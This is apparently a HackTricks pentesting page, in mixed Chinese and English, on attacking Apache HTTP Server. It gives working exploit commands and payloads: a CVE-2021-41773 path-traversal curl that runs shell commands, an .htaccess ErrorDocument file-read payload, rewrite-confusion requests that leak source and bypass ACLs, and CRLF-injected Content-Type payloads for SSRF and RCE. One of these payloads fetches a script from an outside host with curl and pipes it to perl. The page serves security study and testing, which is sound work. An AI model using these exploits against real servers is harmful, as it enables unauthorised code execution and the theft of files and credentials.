# Apache

{{#include ../../banners/hacktricks-training.md}}

## 可执行的 PHP 扩展

检查 Apache 服务器正在执行哪些扩展。要搜索它们，您可以执行：
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
此外，有些地方可以找到此配置：
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
## 通过 .htaccess 的 ErrorDocument file provider 实现 LFI (ap_expr)

如果你能控制某目录的 .htaccess，且该路径的 AllowOverride 包含 FileInfo，就可以在 ErrorDocument 中使用 ap_expr 的 file() 函数，将 404 响应转换为任意本地文件读取。

- 要求：
- Apache 2.4，启用 expression parser (ap_expr)（2.4 中为默认）。
- vhost/dir 必须允许 .htaccess 设置 ErrorDocument（AllowOverride FileInfo）。
- Apache worker 用户必须对目标文件具有读取权限。

.htaccess payload:
```apache
# Optional marker header just to identify your tenant/request path
Header always set X-Debug-Tenant "demo"
# On any 404 under this directory, return the contents of an absolute filesystem path
ErrorDocument 404 %{file:/etc/passwd}
```
通过请求该目录下任何不存在的路径来触发，例如在滥用 userdir-style hosting 时：
```bash
curl -s http://target/~user/does-not-exist | sed -n '1,20p'
```
Notes and tips:
- Only absolute paths work. The content is returned as the response body for the 404 handler.
- Effective read permissions are those of the Apache user (typically www-data/apache). You won’t read /root/* or /etc/shadow in default setups.
- Even if .htaccess is root-owned, if the parent directory is tenant-owned and permits rename, you may be able to rename the original .htaccess and upload your own replacement via SFTP/FTP:
- rename .htaccess .htaccess.bk
- put your malicious .htaccess
- Use this to read application source under DocumentRoot or vhost config paths to harvest secrets (DB creds, API keys, etc.).

## Confusion Attack <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

These types of attacks has been introduced and documented [**by Orange in this blog post**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) and the following is a summary. The "confusion" attack basically abuses how the tens of modules that work together creating a Apache don't work perfectly synchronised and making some of them modify some unexpected data can cause a vulnerability in a later module.

### Filename Confusion

#### Truncation

The **`mod_rewrite`** will trim the content of `r->filename` after the character `?` ([_**modules/mappers/mod_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141)). This isn't totally wrong as most modules will treat `r->filename` as an URL. Bur in other occasions this will be treated as file path, which would cause a problem.

- **Path Truncation**

It's possible to abuse `mod_rewrite` like in the following rule example to access other files inside the file system, removing the last part of the expected path adding simply a `?`:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
# the output of file `/var/user/orange/secret.yml`
```
- **误导性 RewriteFlag 赋值**

在下面的重写规则中，只要 URL 以 .php 结尾，它就会被视为并作为 php 执行。因此，可以发送一个在 `?` 字符之后以 .php 结尾的 URL，同时在路径中加载不同类型的文件（例如图像），该文件内部包含恶意 php 代码：
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **ACL Bypass**

可以访问本不应被访问的文件，即使通过如下配置访问应该被拒绝：
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
这是因为默认情况下 PHP-FPM 会接收以 `.php` 结尾的 URL，例如 `http://server/admin.php%3Fooo.php`，并且由于 PHP-FPM 会移除字符 `?` 之后的所有内容，前面的 URL 将允许加载 `/admin.php`，即使之前的规则禁止它。

### DocumentRoot 混淆
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
关于 Apache 的一个有趣事实是，前面的 rewrite 会尝试同时从 documentRoot 和 root 访问文件。因此，对 `https://server/abouth.html` 的请求会在文件系统中检查 `/var/www/html/about.html` 和 `/about.html`。这基本上可以被滥用来访问文件系统中的文件。

#### **Server-Side Source Code Disclosure**

- **Disclose CGI Source Code**

只需在末尾添加 %3F 就足以 leak cgi 模块的源代码：
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
- **披露 PHP Source Code**

如果服务器配置了多个域名，其中一个是静态域名，攻击者可以滥用它来遍历文件系统并 leak php code:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Local Gadgets Manipulation**

之前攻击的主要问题是，默认情况下对文件系统的大多数访问会被拒绝，正如 Apache HTTP Server 的 [configuration template](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115)：
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
然而，[Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) 操作系统默认允许 `/usr/share`：
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
因此，可以在这些发行版中**滥用位于 `/usr/share` 的文件。**

**Local Gadget to Information Disclosure**

- **Apache HTTP Server** with **websocketd** 可能会在 **/usr/share/doc/websocketd/examples/php/** 暴露 **dump-env.php** 脚本，这可能会 leak 敏感的环境变量。
- 使用 **Nginx** 或 **Jetty** 的服务器可能会通过放置在 **/usr/share** 下的默认 web 根暴露敏感的 web 应用信息（例如 **web.xml**）：
- **/usr/share/nginx/html/**
- **/usr/share/jetty9/etc/**
- **/usr/share/jetty9/webapps/**

**Local Gadget to XSS**

- 在安装了 **LibreOffice** 的 Ubuntu Desktop 上，利用帮助文件的语言切换功能可能导致 **Cross-Site Scripting (XSS)**。在 **/usr/share/libreoffice/help/help.html** 操作 URL 可以通过不安全的 RewriteRule 重定向到恶意页面或旧版本。

**Local Gadget to LFI**

- 如果安装了 PHP 或某些前端包（如 **JpGraph** 或 **jQuery-jFeed**），它们的文件可能被利用来读取敏感文件如 **/etc/passwd**：
- **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
- **/usr/share/javascript/jquery-jfeed/proxy.php**
- **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**Local Gadget to SSRF**

- 利用 **MagpieRSS** 的 **magpie_debug.php**（位于 **/usr/share/php/magpierss/scripts/magpie_debug.php**）可以很容易地构造出 SSRF 漏洞，为进一步利用提供入口。

**Local Gadget to RCE**

- 存在大量可导致 **Remote Code Execution (RCE)** 的机会，例如过时的 **PHPUnit** 或 **phpLiteAdmin** 安装。可以利用这些来执行任意代码，展示本地 gadget 操作的广泛潜力。

#### **Jailbreak from Local Gadgets**

也可以通过跟随这些文件夹中安装软件生成的符号链接从允许的文件夹中实现越狱，例如：

- **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
- **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
- **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
- **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
- **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

此外，滥用符号链接曾导致在 Redmine 中获得 **RCE**。

### Handler Confusion <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

此类攻击利用了 `AddHandler` 和 `AddType` 指令在功能上的重叠，这两者都可以用来 **启用 PHP 处理**。最初，这些指令分别影响服务器内部结构中的不同字段（分别为 `r->handler` 和 `r->content_type`）。然而，由于遗留代码的存在，Apache 在某些条件下会互换处理这些指令：如果设置了 `r->content_type` 而 `r->handler` 未设置，则会将 `r->content_type` 转换为 `r->handler`。

此外，在 Apache HTTP Server（`server/config.c#L420`）中，如果在执行 `ap_run_handler()` 之前 `r->handler` 为空，服务器会**使用 `r->content_type` 作为 handler**，这实际上使 `AddType` 和 `AddHandler` 在效果上等同。

#### **Overwrite Handler to Disclose PHP Source Code**

在 [**this talk**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf) 中展示了一个漏洞：客户端发送不正确的 `Content-Length` 可能导致 Apache 错误地**返回 PHP 源代码**。这是由于 ModSecurity 与 Apache Portable Runtime (APR) 的错误处理问题，双重响应会导致 `r->content_type` 被覆盖为 `text/html`。\
因为 ModSecurity 未正确处理返回值，它会返回 PHP 代码而不会对其进行解释。

#### **Overwrite Handler to XXXX**

TODO: Orange hasn't disclose this vulnerability yet

### **Invoke Arbitrary Handlers**

如果攻击者能够控制服务器响应中的 **`Content-Type`** 头，他将能够**调用任意模块 handler**。不过，到攻击者控制该头时，请求的大部分处理流程通常已完成。然而，可以通过滥用 `Location` 头来**重启请求处理流程**，因为如果返回的 `Status` 为 200 且 `Location` 头以 `/` 开头，则该响应被视为服务器端重定向并应被重新处理。

根据 [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875)（关于 CGI 的规范）在 [Section 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) 中定义了本地重定向响应行为：

> CGI 脚本可以在 Location 头字段返回本地资源的 URI 路径和查询字符串（“local-pathquery”）。这表示服务器应使用指定的路径重新处理该请求。

因此，要执行此攻击，需具备以下其中之一的漏洞：

- CGI 响应头中的 CRLF 注入（CRLF Injection）
- 能完全控制响应头的 SSRF

#### **Arbitrary Handler to Information Disclosure**

例如 `/server-status` 应仅在本地可访问：
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
可以通过将 `Content-Type` 设置为 `server-status` 并将 Location 头设置为以 `/` 开头来访问它。
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Arbitrary Handler to Full SSRF**

重定向到 `mod_proxy` 以访问任何 URL 上的任何协议：
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
但是，已添加 `X-Forwarded-For` 头，阻止访问云元数据端点。

#### **任意处理程序以访问本地 Unix 域套接字**

访问 PHP-FPM 的本地 Unix 域套接字以执行位于 `/tmp/` 的 PHP 后门：
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Arbitrary Handler to RCE**

官方 [PHP Docker](https://hub.docker.com/_/php) 镜像包含 PEAR (`Pearcmd.php`)，这是一个命令行 PHP 包管理工具，可能被滥用以获取 RCE:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
查看 [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)，作者 [Phith0n](https://x.com/phithon_xg)，以获取此技术的详细信息。

## References

- [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)
- [Apache 2.4 Custom Error Responses (ErrorDocument)](https://httpd.apache.org/docs/2.4/custom-error.html)
- [Apache 2.4 Expressions and functions (file:)](https://httpd.apache.org/docs/2.4/expr.html)
- [HTB Zero write-up: .htaccess ErrorDocument LFI and cron pgrep abuse](https://0xdf.gitlab.io/2025/08/12/htb-zero.html)

{{#include ../../banners/hacktricks-training.md}}
